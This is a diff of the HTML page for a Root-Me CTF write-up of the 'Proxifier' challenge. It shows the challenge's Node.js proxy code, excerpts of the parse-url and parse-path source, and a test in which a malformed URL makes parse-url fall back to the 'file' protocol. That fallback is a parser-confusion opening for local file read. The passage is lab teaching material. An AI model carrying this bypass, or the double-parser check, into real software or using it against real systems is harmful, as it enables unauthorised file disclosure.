@@ -11,9 +11,9 @@
 <meta property="article:published_time" content="2023-03-02T00:00:00+00:00" />
 <meta property="article:modified_time" content="2023-03-02T00:00:00+00:00" /><meta property="og:site_name" content="Root-Me Blog" />
 
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Writeup - Root-Me CTF 10k - Proxifier"/>
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Writeup - Root-Me CTF 10k - Proxifier"/>
 <meta name="twitter:description" content="Writeup of the &lsquo;Proxifier&rsquo; challenge during the Root-Me CTF 10k"/>
+<meta name="twitter:site" content="@rootme_org"/>
 <meta name="application-name" content="Root-Me Blog">
 <meta name="apple-mobile-web-app-title" content="Root-Me Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
@@ -28,7 +28,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/blog.root-me.org\/posts\/writeup_ctf10k_proxifier\/"
-        },"genre": "posts","keywords": "writeups, CTF10k, LFI, Challenge, Protocol Confusion","wordcount":  1018 ,
+        },"genre": "posts","keywords": "writeups, CTF10k, LFI, Challenge, Protocol Confusion","wordcount":  1042 ,
         "url": "https:\/\/blog.root-me.org\/posts\/writeup_ctf10k_proxifier\/","datePublished": "2023-03-02T00:00:00+00:00","dateModified": "2023-03-02T00:00:00+00:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -84,7 +84,7 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Writeup - Root-Me CTF 10k - Proxifier</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="https://www.root-me.org/Mizu" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Kévin_Mizu</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeups/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeups</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-03-02">2023-03-02</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1018 words&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-03-02">2023-03-02</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1042 words&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
                 <div class="details-summary toc-title">
@@ -117,64 +117,64 @@
 <hr>
 <h2 id="-recon">🕵️ Recon</h2>
 <p>Like with <a href="/posts/writeup_ctf10k_simple_login/" rel="">simple_login</a>, for this challenge we have access to the code. So, the first step is to take a look into it:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kr">const</span> <span class="nx">parseUrl</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;parse-url&#34;</span><span class="p">);</span>
-<span class="kr">const</span> <span class="nx">urlParse</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;url-parse&#34;</span><span class="p">);</span>
-<span class="kr">const</span> <span class="nx">fetch</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;node-fetch&#34;</span><span class="p">);</span>
-<span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;express&#34;</span><span class="p">);</span>
-<span class="kr">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;path&#34;</span><span class="p">);</span>
-<span class="kr">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;fs&#34;</span><span class="p">);</span>
-
-<span class="kr">const</span> <span class="nx">FLAG_PATH</span> <span class="o">=</span> <span class="s2">&#34;*censored*&#34;</span><span class="p">;</span>
-<span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
-
-<span class="kd">var</span> <span class="nx">getURL</span> <span class="o">=</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">url</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
-  <span class="c1">// INIT
-</span><span class="c1"></span>  <span class="kd">var</span> <span class="nx">protocol</span> <span class="o">=</span> <span class="nx">urlParse</span><span class="p">(</span><span class="nx">url</span><span class="p">)[</span><span class="s2">&#34;protocol&#34;</span><span class="p">];</span>
-  <span class="kd">var</span> <span class="nx">host</span> <span class="o">=</span> <span class="nx">urlParse</span><span class="p">(</span><span class="nx">url</span><span class="p">)[</span><span class="s2">&#34;host&#34;</span><span class="p">];</span>
-  <span class="kd">var</span> <span class="nx">pathname</span> <span class="o">=</span> <span class="nx">urlParse</span><span class="p">(</span><span class="nx">url</span><span class="p">)[</span><span class="s2">&#34;pathname&#34;</span><span class="p">];</span>
-
-  <span class="k">if</span> <span class="p">(</span><span class="nx">protocol</span> <span class="o">===</span> <span class="s2">&#34;https:&#34;</span> <span class="o">&amp;&amp;</span> <span class="nx">host</span><span class="p">.</span><span class="nx">endsWith</span><span class="p">(</span><span class="s2">&#34;root-me.org&#34;</span><span class="p">))</span> <span class="p">{</span>
-    <span class="c1">// DOUBLE CHECK
-</span><span class="c1"></span>    <span class="nx">protocol</span> <span class="o">=</span> <span class="nx">parseUrl</span><span class="p">(</span><span class="nx">url</span><span class="p">)[</span><span class="s2">&#34;protocol&#34;</span><span class="p">];</span>
-    <span class="nx">host</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="nx">pathname</span><span class="p">,</span> <span class="sb">`https://root-me.org/mizu`</span><span class="p">)[</span><span class="s2">&#34;host&#34;</span><span class="p">];</span>
-    <span class="nx">pathname</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="nx">pathname</span><span class="p">,</span> <span class="sb">`https://root-me.org/mizu`</span><span class="p">)[</span><span class="s2">&#34;pathname&#34;</span><span class="p">];</span>
-
-    <span class="c1">// REMOTE
-</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">protocol</span> <span class="o">===</span> <span class="s2">&#34;https&#34;</span><span class="p">)</span> <span class="p">{</span>
-      <span class="k">try</span> <span class="p">{</span>
-        <span class="kd">var</span> <span class="nx">res</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">protocol</span><span class="si">}</span><span class="sb">://</span><span class="si">${</span><span class="nx">host</span><span class="si">}${</span><span class="nx">pathname</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
-        <span class="nx">res</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">res</span><span class="p">.</span><span class="nx">text</span><span class="p">();</span>
-        <span class="k">return</span> <span class="nx">res</span>
-      <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span>
-        <span class="k">return</span> <span class="s2">&#34;Error fetching data.&#34;</span><span class="p">;</span>
-      <span class="p">}</span>
-
-      <span class="c1">// LOCAL
-</span><span class="c1"></span>    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">protocol</span> <span class="o">===</span> <span class="s2">&#34;file&#34;</span> <span class="o">&amp;&amp;</span> <span class="nx">host</span> <span class="o">===</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">)</span> <span class="p">{</span>
-      <span class="k">try</span> <span class="p">{</span>
-        <span class="k">return</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="nx">pathname</span><span class="p">,</span> <span class="s2">&#34;utf8&#34;</span><span class="p">);</span>
-      <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span>
-        <span class="k">return</span> <span class="s2">&#34;No such file or directory.&#34;</span><span class="p">;</span>
-      <span class="p">}</span>
-    <span class="p">}</span>
-
-  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-    <span class="k">return</span> <span class="s2">&#34;Protocol must be https and host end with &#39;root-me.org&#39;.&#34;</span><span class="p">;</span>
-  <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;/proxy&#34;</span><span class="p">,</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
-  <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">url</span> <span class="o">!==</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
-    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kr">await</span> <span class="nx">getURL</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">url</span><span class="p">));</span>
-  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;[ERROR] No URL send!&#34;</span><span class="p">)</span>
-  <span class="p">}</span>
-<span class="p">});</span>
-
-<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="mi">3000</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
-  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Express server listening on port 3000`</span><span class="p">)</span>
-<span class="p">})</span>
-</code></pre></div><p>As we can see, the website has an endpoint <code>/proxy</code> which take as an input the <code>url</code> get parameter. Then, our input is sent to the <code>getURL</code> function which is where all the magic occurs. This function will do the following:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">parseUrl</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;parse-url&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">urlParse</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;url-parse&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">fetch</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;node-fetch&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;express&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;path&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;fs&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">FLAG_PATH</span> <span class="o">=</span> <span class="s2">&#34;*censored*&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">getURL</span> <span class="o">=</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">url</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// INIT
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kd">var</span> <span class="nx">protocol</span> <span class="o">=</span> <span class="nx">urlParse</span><span class="p">(</span><span class="nx">url</span><span class="p">)[</span><span class="s2">&#34;protocol&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">host</span> <span class="o">=</span> <span class="nx">urlParse</span><span class="p">(</span><span class="nx">url</span><span class="p">)[</span><span class="s2">&#34;host&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">pathname</span> <span class="o">=</span> <span class="nx">urlParse</span><span class="p">(</span><span class="nx">url</span><span class="p">)[</span><span class="s2">&#34;pathname&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">protocol</span> <span class="o">===</span> <span class="s2">&#34;https:&#34;</span> <span class="o">&amp;&amp;</span> <span class="nx">host</span><span class="p">.</span><span class="nx">endsWith</span><span class="p">(</span><span class="s2">&#34;root-me.org&#34;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// DOUBLE CHECK
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">protocol</span> <span class="o">=</span> <span class="nx">parseUrl</span><span class="p">(</span><span class="nx">url</span><span class="p">)[</span><span class="s2">&#34;protocol&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">host</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="nx">pathname</span><span class="p">,</span> <span class="sb">`https://root-me.org/mizu`</span><span class="p">)[</span><span class="s2">&#34;host&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">pathname</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="nx">pathname</span><span class="p">,</span> <span class="sb">`https://root-me.org/mizu`</span><span class="p">)[</span><span class="s2">&#34;pathname&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// REMOTE
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">protocol</span> <span class="o">===</span> <span class="s2">&#34;https&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">res</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">protocol</span><span class="si">}</span><span class="sb">://</span><span class="si">${</span><span class="nx">host</span><span class="si">}${</span><span class="nx">pathname</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">res</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">res</span><span class="p">.</span><span class="nx">text</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">res</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;Error fetching data.&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="c1">// LOCAL
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">protocol</span> <span class="o">===</span> <span class="s2">&#34;file&#34;</span> <span class="o">&amp;&amp;</span> <span class="nx">host</span> <span class="o">===</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="nx">pathname</span><span class="p">,</span> <span class="s2">&#34;utf8&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;No such file or directory.&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;Protocol must be https and host end with &#39;root-me.org&#39;.&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;/proxy&#34;</span><span class="p">,</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">url</span> <span class="o">!==</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kr">await</span> <span class="nx">getURL</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">url</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;[ERROR] No URL send!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="mi">3000</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Express server listening on port 3000`</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span></code></pre></div><p>As we can see, the website has an endpoint <code>/proxy</code> which take as an input the <code>url</code> get parameter. Then, our input is sent to the <code>getURL</code> function which is where all the magic occurs. This function will do the following:</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -195,98 +195,98 @@
         title="meme1.png" /></p>
 <p>At this point there is two way to find this vulnerability: trying random input into both parser and wait to have the desire output or dive into <code>parse-url@7.0.2</code> source code and try to find the issue. In this writeup, we will focus on the second one. By going to <a href="https://www.npmjs.com/package/parse-url" target="_blank" rel="noopener noreffer ">npm</a>, we could have this github repository: <a href="https://github.com/IonicaBizau/parse-url" target="_blank" rel="noopener noreffer ">link</a>.</p>
 <p>On this, we can get the source code which is really really short. (87 lines)</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="c1">// Dependencies
-</span><span class="c1"></span><span class="kr">import</span> <span class="nx">parsePath</span> <span class="nx">from</span> <span class="s2">&#34;parse-path&#34;</span><span class="p">;</span>
-<span class="kr">import</span> <span class="nx">normalizeUrl</span> <span class="nx">from</span> <span class="s2">&#34;normalize-url&#34;</span><span class="p">;</span>
-
-<span class="p">...</span>
-
-<span class="kr">const</span> <span class="nx">parseUrl</span> <span class="o">=</span> <span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">normalize</span> <span class="o">=</span> <span class="kc">false</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
-
-  <span class="p">...</span>
-
-  <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">url</span> <span class="o">!==</span> <span class="s2">&#34;string&#34;</span> <span class="o">||</span> <span class="o">!</span><span class="nx">url</span><span class="p">.</span><span class="nx">trim</span><span class="p">())</span> <span class="p">{</span>
-      <span class="nx">throwErr</span><span class="p">(</span><span class="s2">&#34;Invalid url.&#34;</span><span class="p">)</span>
-  <span class="p">}</span>
-
-  <span class="k">if</span> <span class="p">(</span><span class="nx">url</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="nx">parseUrl</span><span class="p">.</span><span class="nx">MAX_INPUT_LENGTH</span><span class="p">)</span> <span class="p">{</span>
-      <span class="nx">throwErr</span><span class="p">(</span><span class="s2">&#34;Input exceeds maximum length. If needed, change the value of parseUrl.MAX_INPUT_LENGTH.&#34;</span><span class="p">)</span>
-  <span class="p">}</span>
-
-  <span class="k">if</span> <span class="p">(</span><span class="nx">normalize</span><span class="p">)</span> <span class="p">{</span>
-      <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">normalize</span> <span class="o">!==</span> <span class="s2">&#34;object&#34;</span><span class="p">)</span> <span class="p">{</span>
-          <span class="nx">normalize</span> <span class="o">=</span> <span class="p">{</span>
-              <span class="nx">stripHash</span><span class="o">:</span> <span class="kc">false</span>
-          <span class="p">}</span>
-      <span class="p">}</span>
-      <span class="nx">url</span> <span class="o">=</span> <span class="nx">normalizeUrl</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">normalize</span><span class="p">)</span>
-  <span class="p">}</span>
-
-  <span class="kr">const</span> <span class="nx">parsed</span> <span class="o">=</span> <span class="nx">parsePath</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span>
-
-  <span class="p">...</span>
-
-  <span class="k">return</span> <span class="nx">parsed</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></div><p>Inside it, we could see that the most important part of the parsing is done by the function <code>parsePath(url)</code>. Looking into the code, we could find that it comes from another library (<a href="https://www.npmjs.com/package/parse-path" target="_blank" rel="noopener noreffer ">parse-path</a>) developed by the same person. Thus, let&rsquo;s read his code! (<a href="https://github.com/IonicaBizau/parse-path" target="_blank" rel="noopener noreffer ">source</a>)</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="p">...</span>
-
-<span class="kd">function</span> <span class="nx">parsePath</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span> <span class="p">{</span>
-
-  <span class="p">...</span>
-
-  <span class="k">try</span> <span class="p">{</span>
-      <span class="kr">const</span> <span class="nx">parsed</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span>
-      <span class="nx">output</span><span class="p">.</span><span class="nx">protocols</span> <span class="o">=</span> <span class="nx">protocols</span><span class="p">(</span><span class="nx">parsed</span><span class="p">)</span>
-      <span class="nx">output</span><span class="p">.</span><span class="nx">protocol</span> <span class="o">=</span> <span class="nx">output</span><span class="p">.</span><span class="nx">protocols</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
-      <span class="nx">output</span><span class="p">.</span><span class="nx">port</span> <span class="o">=</span> <span class="nx">parsed</span><span class="p">.</span><span class="nx">port</span>
-      <span class="nx">output</span><span class="p">.</span><span class="nx">resource</span> <span class="o">=</span>  <span class="nx">parsed</span><span class="p">.</span><span class="nx">hostname</span>
-      <span class="nx">output</span><span class="p">.</span><span class="nx">host</span> <span class="o">=</span>  <span class="nx">parsed</span><span class="p">.</span><span class="nx">host</span>
-      <span class="nx">output</span><span class="p">.</span><span class="nx">user</span> <span class="o">=</span> <span class="nx">parsed</span><span class="p">.</span><span class="nx">username</span> <span class="o">||</span> <span class="s2">&#34;&#34;</span>
-      <span class="nx">output</span><span class="p">.</span><span class="nx">password</span> <span class="o">=</span> <span class="nx">parsed</span><span class="p">.</span><span class="nx">password</span> <span class="o">||</span> <span class="s2">&#34;&#34;</span>
-      <span class="nx">output</span><span class="p">.</span><span class="nx">pathname</span> <span class="o">=</span> <span class="nx">parsed</span><span class="p">.</span><span class="nx">pathname</span>
-      <span class="nx">output</span><span class="p">.</span><span class="nx">hash</span> <span class="o">=</span> <span class="nx">parsed</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-      <span class="nx">output</span><span class="p">.</span><span class="nx">search</span> <span class="o">=</span> <span class="nx">parsed</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-      <span class="nx">output</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">parsed</span><span class="p">.</span><span class="nx">href</span>
-      <span class="nx">output</span><span class="p">.</span><span class="nx">query</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">fromEntries</span><span class="p">(</span><span class="nx">parsed</span><span class="p">.</span><span class="nx">searchParams</span><span class="p">)</span>
-  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
-      <span class="c1">// TODO Maybe check if it is a valid local file path
-</span><span class="c1"></span>      <span class="c1">//      In any case, these will be parsed by higher
-</span><span class="c1"></span>      <span class="c1">//      level parsers such as parse-url, git-url-parse, git-up
-</span><span class="c1"></span>      <span class="nx">output</span><span class="p">.</span><span class="nx">protocols</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">]</span>
-      <span class="nx">output</span><span class="p">.</span><span class="nx">protocol</span> <span class="o">=</span> <span class="nx">output</span><span class="p">.</span><span class="nx">protocols</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
-      <span class="nx">output</span><span class="p">.</span><span class="nx">port</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
-      <span class="nx">output</span><span class="p">.</span><span class="nx">resource</span> <span class="o">=</span>  <span class="s2">&#34;&#34;</span>
-      <span class="nx">output</span><span class="p">.</span><span class="nx">user</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
-      <span class="nx">output</span><span class="p">.</span><span class="nx">pathname</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
-      <span class="nx">output</span><span class="p">.</span><span class="nx">hash</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
-      <span class="nx">output</span><span class="p">.</span><span class="nx">search</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
-      <span class="nx">output</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">url</span>
-      <span class="nx">output</span><span class="p">.</span><span class="nx">query</span> <span class="o">=</span> <span class="p">{}</span>
-      <span class="nx">output</span><span class="p">.</span><span class="nx">parse_failed</span> <span class="o">=</span> <span class="kc">true</span>
-  <span class="p">}</span>
-
-  <span class="k">return</span> <span class="nx">output</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></div><p>And this is where is starting to be interesting. As we can see, if our input crash during the <code>new URL</code> parsing, it will return the <code>file://</code> wrapper by default! Let&rsquo;s try this with a simple invalid URL:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="kr">const</span> <span class="nx">parseUrl</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;parse-url&#34;</span><span class="p">);</span>
-
-<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">parseUrl</span><span class="p">(</span><span class="s2">&#34;://mizu.re&#34;</span><span class="p">))</span>
-</code></pre></div><p>Output:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
-  <span class="nt">&#34;protocols&#34;</span><span class="p">:</span> <span class="p">[</span> <span class="s2">&#34;file&#34;</span> <span class="p">],</span>
-  <span class="nt">&#34;protocol&#34;</span><span class="p">:</span> <span class="s2">&#34;file&#34;</span><span class="p">,</span>
-  <span class="nt">&#34;port&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
-  <span class="nt">&#34;resource&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
-  <span class="nt">&#34;user&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
-  <span class="nt">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
-  <span class="nt">&#34;pathname&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
-  <span class="nt">&#34;hash&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
-  <span class="nt">&#34;search&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
-  <span class="nt">&#34;href&#34;</span><span class="p">:</span> <span class="s2">&#34;://mizu.re&#34;</span><span class="p">,</span>
-  <span class="nt">&#34;query&#34;</span><span class="p">:</span> <span class="p">{}</span>
-<span class="p">}</span>
-</code></pre></div><p>As we can see, we manage to get the <code>file://</code> wrapper.</p>
